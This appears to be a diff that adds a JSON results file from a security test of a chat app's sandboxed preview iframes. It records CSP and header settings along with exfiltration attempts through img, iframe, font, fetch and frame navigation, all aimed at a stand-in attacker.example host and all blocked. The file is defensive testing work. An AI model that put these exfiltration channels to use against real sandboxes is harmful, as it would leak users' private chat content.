@@ -1,0 +1,76 @@
+{
+  "chatCsp": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com; frame-src 'self' https://verification-center.tinfoil.sh https://webapp-sandbox.tinfoil.sh https://tinfoil-webapp-sandbox-tinfoil.vercel.app; frame-ancestors https://tinfoil.sh https://www.tinfoil.sh; base-uri 'self'; form-action 'self'; upgrade-insecure-requests",
+  "sandboxPreviewHeaders": {
+    "Access-Control-Allow-Origin": "*",
+    "Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=(), usb=(), publickey-credentials-get=(), publickey-credentials-create=()",
+    "Referrer-Policy": "no-referrer",
+    "X-Content-Type-Options": "nosniff",
+    "Origin-Agent-Cluster": "?1",
+    "Cache-Control": "public, max-age=0, must-revalidate",
+    "Content-Security-Policy": "default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src https: data: blob:; media-src https: data: blob:; font-src https: data:; frame-src https: data:; base-uri 'none'; form-action 'none'; sandbox allow-scripts; frame-ancestors https://*.tinfoil.sh"
+  },
+  "cspOverride": "default-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src data: blob:; media-src data: blob:; font-src data:; base-uri 'none'; form-action 'none'; sandbox allow-scripts; frame-ancestors https://*.tinfoil.sh",
+  "results": {
+    "legit: html preview reports its height": "ok",
+    "legit: js preview reports console output": "ok",
+    "legit: artifact runs inline script with storage shims and data: images": "ok",
+    "artifact: <img> to attacker (img-src https:)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-via-img' violates the following Content Security Policy directive: \"img-src data: bl"
+      ]
+    },
+    "artifact: <iframe> to attacker page, which fetches home (frame-src https:)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Framing 'https://attacker.example/' violates the following Content Security Policy directive: \"default-src 'none'\". The request has been blocked. Note that 'fra"
+      ]
+    },
+    "artifact: self-navigation of the nested frame": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Framing 'https://attacker.example/' violates the following Content Security Policy directive: \"default-src 'none'\". The request has been blocked. Note that 'fra"
+      ]
+    },
+    "artifact: @font-face to attacker (font-src https:)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Loading the font 'https://attacker.example/font?d=CONFIDENTIAL_CHAT_CONTENT-via-font' violates the following Content Security Policy directive: \"font-src data:\""
+      ]
+    },
+    "artifact: fetch() to attacker (control: connect-src falls to default-src none)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT' violates the following Content Security Policy directive: \"default-src 'none'\". Note ",
+        "Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT. Refused to connect because it violates the document's Content Security Policy."
+      ]
+    },
+    "html preview: <img> to attacker (control: meta CSP img-src data:)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-html-img' violates the following Content Security Policy directive: \"img-src data: b",
+        "Loading the image 'https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-html-img' violates the following Content Security Policy directive: \"img-src data:\"."
+      ]
+    },
+    "html preview: self-navigation of the nested frame": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Framing 'https://attacker.example/' violates the following Content Security Policy directive: \"default-src 'none'\". The request has been blocked. Note that 'fra"
+      ]
+    },
+    "js preview: fetch() to attacker (control: default-src none)": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: \"default-src 'none'\". No",
+        "Connecting to 'https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js' violates the following Content Security Policy directive: \"default-src 'none'\". No",
+        "Fetch API cannot load https://attacker.example/fetch?d=CONFIDENTIAL_CHAT_CONTENT-js. Refused to connect because it violates the document's Content Security Poli"
+      ]
+    },
+    "js preview: self-navigation of the nested frame": {
+      "reachedAttacker": [],
+      "cspViolations": [
+        "Framing 'https://attacker.example/' violates the following Content Security Policy directive: \"default-src 'none'\". The request has been blocked. Note that 'fra"
+      ]
+    }
+  }
+}
